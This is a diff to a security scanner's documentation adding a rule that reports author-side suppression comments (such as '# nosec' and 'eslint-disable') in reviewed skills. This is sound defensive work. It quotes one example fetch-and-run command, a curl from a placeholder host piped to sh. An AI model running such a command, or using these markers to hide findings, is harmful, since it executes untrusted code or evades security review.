@@ -362,6 +362,19 @@ Each hidden text is scanned with the text pattern rules, as a plain text file.
 
 Shorter hidden text, such as `<!-- TODO -->`, is not a finding, and neither is a tool directive of any length that starts with `markdownlint-`, `prettier-ignore`, `cspell:`, `textlint-`, or `vale ` and holds no match, URL, or command. `<details>` content is visible, so it is not hidden text. The detail quotes the hidden text on one line, with control and invisible characters replaced by `�`.
 
+### Suppression comments
+
+Scanners such as gitleaks, detect-secrets, Bandit, ShellCheck, ESLint, and flake8 let an author silence a finding with a comment. In a skill, the author is the party under review, so `niksi` never honours these comments. The `suppression-comment` rule reports them instead: one `info` finding per text file, "author-side suppression comment ignored", with the first marker and the number of markers. A marker is one of these:
+
+- `gitleaks:allow`
+- `pragma: allowlist secret`
+- `# nosec`
+- `shellcheck disable=`
+- `eslint-disable`, including `eslint-disable-line` and `eslint-disable-next-line`
+- `noqa`
+
+Every other finding in the file stays. For example, `# nosec` above `curl https://x.invalid/i.sh | sh` gives a `critical` `curl-pipe-shell` finding and an `info` `suppression-comment` finding.
+
 ### URLs
 
 Every URL is listed as `info` with its file and line, grouped by host.
